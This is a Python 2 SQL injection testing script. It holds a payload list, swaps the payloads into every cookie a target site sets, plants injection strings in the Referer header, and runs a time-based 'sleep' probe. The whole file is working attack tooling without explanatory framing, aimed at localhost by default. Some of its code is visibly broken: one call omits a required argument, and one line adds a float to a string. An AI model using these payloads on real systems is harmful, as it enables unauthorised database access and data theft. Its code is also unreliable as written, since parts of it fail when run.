import requests
import httplib


sqli_payloads = [
"\'-\'",
"\' \'",
"\'&\'",
"\'^\'",
"\'*\'",
"\' or \'\'-\'",
"\' or \'\' \'",
"\' or \'\'&\'",
"\' or \'\'^\'",
"\' or \'\'*\'",
"\"-\'",
"\" \"",
"\"&\"",
"\" or \"\"^\"",
"\" or \"\"*\"",
"or true--",
" or true--",
"\' or true--",
"\") or true--",
"\') or true--",
"\' or \'x\'=\'x",
"\') or (\'x\')=(\'x",
"\')) or ((\'x\'))=((\'x",
"\" or \"x\"=\"x",
"\") or (\"x\")=(\"x",
"\")) or ((\"x\"))=((\"x"
]

def get_cookies(url):
    session = requests.Session()
    session.cookies.get_dict()
    {}
    response = session.get(url)
    cookies = session.cookies.get_dict()
    return cookies

        
def cookie_sqli(target_url,payload):
    patch_send()
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36','referer':'\'or 1=1--'}
    snagged_snacks = get_cookies(target_url)
    for k, v in snagged_snacks.iteritems():
        snagged_snacks[k] = payload
    base_resp_time = requests.get(target_url,verify=False, headers=headers).elapsed.total_seconds()
    print "Base Response Time Recorded And Set:"+""+str(base_resp_time)
    print snagged_snacks
    resp = requests.get(target_url, cookies=snagged_snacks,headers=headers,verify=False)
    print resp.content
    if "you have an error in your sql syntax" in resp.content.lower():
       print resp.content + "\n"
       print "SQLI DETECTED POSSIBLY\n"



def patch_send():
    old_send= httplib.HTTPConnection.send
    def new_send( self, data ):
        print data
        return old_send(self, data) #return is not necessary, but never hurts, in case the library is changed
    httplib.HTTPConnection.send= new_send
        
def rce_test(url,cookies,base_resp_time):              
    try:
      
        resp_timer = requests.get(url, cookies=cookies,verify=False).elapsed.total_seconds()
        print resp_timer
        
        print "Time to Target:"+ ""+str(resp_timer) +"\n"
        if resp_timer > base_resp_time:
           diff = base_resp_time / resp_timer
           print "Detected a Difference In Response Times\n"
           print "Difference:"+""+diff  +"\n"

        else:
           print "No Time Skew Detected\n"
    except:
        pass
    
def sleepy_logic(target_url):
    for num in range(1,25):
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36','referer': 'sleep('+str(num)+');'}
        snagged_snacks = get_cookies(target_url)
        for k, v in snagged_snacks.iteritems():
            snagged_snacks[k] = 'sleep('+str(num)+')'
        base_resp_time = requests.get(target_url,verify=False, headers=headers).elapsed.total_seconds()
        print "Base Response Time Recorded And Set:"+""+str(base_resp_time) +"\n"
        print snagged_snacks
        rce_test(target_url,snagged_snacks,base_resp_time)
    
def main():
   patch_send()
   target_url = "http://127.0.0.1/webserver.py"
   #sleepy_logic(target_url)
   cookie_sqli(target_url)
   for payloads in sqli_payloads:
       print payloads
       try:
           cookie_sqli(target_url,str(payloads))
       except:
           pass
    
main()

